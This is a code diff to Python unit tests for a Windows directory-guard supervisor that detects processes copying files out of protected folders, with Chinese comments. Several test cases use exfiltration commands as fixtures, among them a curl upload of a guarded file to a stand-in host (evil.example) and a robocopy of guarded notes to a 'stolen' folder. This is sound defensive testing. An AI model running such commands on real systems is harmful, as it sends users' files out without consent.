@@ -72,13 +72,10 @@ class Base(unittest.TestCase):
             }, f, ensure_ascii=False, indent=1)
         return mc.MineRegistry(path=self.reg_path)
 
-    def _mine(self, action=mc.ACTION_WARN, path=None):
-        return [{"path": path or self.guard, "action": action,
-                 "enabled": True}]
-
-    def sup(self, mines, force_warn=True):
+    def sup(self, mines, force_warn=True, strict_orphans=False):
         """默认 force_warn=True —— 测试里除了专用用例，绝不会真杀进程。"""
-        return mc.MineSupervisor(self.reg(mines), force_warn=force_warn)
+        return mc.MineSupervisor(self.reg(mines), force_warn=force_warn,
+                                 strict_orphans=strict_orphans)
 
     def records(self):
         if not os.path.exists(self.log_path):
@@ -139,11 +136,31 @@ class KillSemantics(Base):
         """动作=警告：只落档，OS 不收到任何终止请求。"""
         s = self.sup([{"path": self.guard, "action": mc.ACTION_WARN}],
                      force_warn=False)
+        s.proc[777001] = {"ppid": 4, "name": "notepad.exe", "cmdline": "",
+                          "exe": "", "created": ""}
         res = self.quiet(lambda: s.fire(s.mines[0], 777001, "测试",
                                                     {"file": "x"}))
         self.assertEqual(res, "warn")
         self.assertIn("KILL_DRYRUN", self.kinds())
         self.assertNotIn("KILL", self.kinds())
+
+    def test_fire_rechecks_protection_after_resolution(self):
+        """进程表暂时缺 PID 时，必须先解析出真实名字再查保护名单。"""
+        s = self.sup(self._mine())
+        pid = 424244
+
+        def fake_ancestry(p):
+            s.proc[p] = {"ppid": 4, "name": "lsass.exe", "cmdline": "",
+                         "exe": "", "created": ""}
+            return [(p, "lsass.exe")], "unknown"
+
+        s.ancestry = fake_ancestry
+        self.assertEqual(
+            self.quiet(lambda: s.fire(s.mines[0], pid, "测试", {})),
+            "refused")
+        rec = [r for r in self.records() if r.get("kind") == "WARN"][-1]
+        self.assertEqual(rec["name"], "lsass.exe")
+        self.assertIn("protected", rec["note"])
 
     def test_protected_process_refused(self):
         for name in ("lsass.exe", "csrss.exe", "explorer.exe", "svchost.exe",
@@ -170,6 +187,8 @@ class KillSemantics(Base):
             self.quiet(lambda: s.fire(s.mines[0], os.getpid(), "测试", {})),
             "refused")
         s.self_ancestors.add(424242)
+        s.proc[424242] = {"ppid": 4, "name": "notepad.exe", "cmdline": "",
+                          "exe": "", "created": ""}
         self.assertEqual(
             self.quiet(lambda: s.fire(s.mines[0], 424242, "测试", {})),
             "refused")
@@ -210,8 +229,9 @@ class KillSemantics(Base):
 class Judgement(Base):
     """两层探测的判定边界。"""
 
-    def _fire_birth(self, action, name, cmd, pid, ppid=700, parent=None):
-        s = self.sup(self._mine(action))
+    def _fire_birth(self, action, name, cmd, pid, ppid=700, parent=None,
+                    strict_orphans=False):
+        s = self.sup(self._mine(action), strict_orphans=strict_orphans)
         ev = self.birth(name, cmd, pid, ppid,
                         parent or r"C:\Windows\System32\svchost.exe")
         self.quiet(lambda: s.register_birth(ev))
@@ -231,6 +251,48 @@ class Judgement(Base):
         kinds = self._fire_birth(
             mc.ACTION_EXPLODE, "curl.exe",
             f'curl -T "{f}" https://evil.example/upload', 500102)
+        self.assertIn("KILL_DRYRUN", kinds)
+
+    def test_layer_b_curl_api_call_is_not_an_upload(self):
+        """curl 只是访问本地控制台 API，不是搬文件。
+
+        真实误杀：`cd <守护目录> && curl 127.0.0.1:8788/api/state`。
+        仅出现 curl 不足以构成上传语义；必须带上 -T/-F/--form 等参数。
+        """
+        cmd = (f'curl.exe -s -X POST http://127.0.0.1:8788/api/mines '
+               f'-H "Content-Type: application/json" '
+               f'-d "{{\\"path\\":\\"{self.guard}\\"}}"')
+        kinds = self._fire_birth(
+            mc.ACTION_EXPLODE, "curl.exe", cmd, 500106,
+            ppid=999999, parent=r"C:\Program Files\Git\bin\bash.exe")
+        self.assertNotIn("KILL_DRYRUN", kinds)
+        self.assertEqual(kinds, [], "本机 API 调用不该触发任何处置")
+
+    def test_layer_b_loopback_upload_is_not_external(self):
+        """即使带上传参数，目标是本机回环也不是“目录外目的地”。"""
+        f = os.path.join(self.guard, "a.txt")
+        kinds = self._fire_birth(
+            mc.ACTION_EXPLODE, "curl.exe",
+            f'curl -T "{f}" http://127.0.0.1:9999/upload', 500107)
+        self.assertEqual(kinds, [])
+
+    def test_layer_b_orphan_ancestry_only_warns(self):
+        """父进程已退出、来源无法确认：Layer B 也必须遵守“不猜”。"""
+        src = os.path.join(self.guard, "notes")
+        kinds = self._fire_birth(
+            mc.ACTION_EXPLODE, "robocopy.exe",
+            f'robocopy.exe "{src}" "C:\\temp\\stolen" /E', 500108,
+            ppid=999999, parent=r"C:\Program Files\Git\bin\bash.exe")
+        self.assertNotIn("KILL_DRYRUN", kinds)
+        self.assertIn("WARN", kinds)
+
+    def test_layer_b_strict_orphans_fires(self):
+        src = os.path.join(self.guard, "notes")
+        kinds = self._fire_birth(
+            mc.ACTION_EXPLODE, "robocopy.exe",
+            f'robocopy.exe "{src}" "C:\\temp\\stolen" /E', 500109,
+            ppid=999999, parent=r"C:\Program Files\Git\bin\bash.exe",
+            strict_orphans=True)
         self.assertIn("KILL_DRYRUN", kinds)
 
     def test_layer_b_inside_directory_does_not_fire(self):
@@ -321,11 +383,28 @@ class PathOwnership(unittest.TestCase):
 class Config(Base):
     """配置读写：清单、默认动作、持久化。"""
 
-    def test_default_mine_is_script_dir(self):
-        reg = self.reg([])
+    def test_default_mine_only_when_registry_missing(self):
+        missing = os.path.join(self.tmp, "does-not-exist.json")
+        reg = mc.MineRegistry(path=missing)
         self.assertEqual(len(reg.mines), 1)
         self.assertEqual(os.path.normcase(reg.mines[0].path),
                          os.path.normcase(mc.HERE))
+
+    def test_explicit_empty_registry_stays_empty(self):
+        """显式的空清单表示“不要地雷”；移除最后一个后不能自动塞回来。"""
+        reg = self.reg([])
+        self.assertEqual(reg.mines, [])
+        reg.save()
+        again = mc.MineRegistry(path=self.reg_path)
+        self.assertEqual(again.mines, [])
+
+    def test_triggers_survive_reload(self):
+        """控制台每次重载配置都会重建 Mine 对象；运行期计数不能因此清零。"""
+        reg = self.reg([{"path": self.guard, "action": mc.ACTION_WARN,
+                         "enabled": True}])
+        reg.mines[0].triggers = 7
+        reg.load()
+        self.assertEqual(reg.mines[0].triggers, 7)
 
     def test_add_is_idempotent_by_path(self):
         reg = self.reg([])
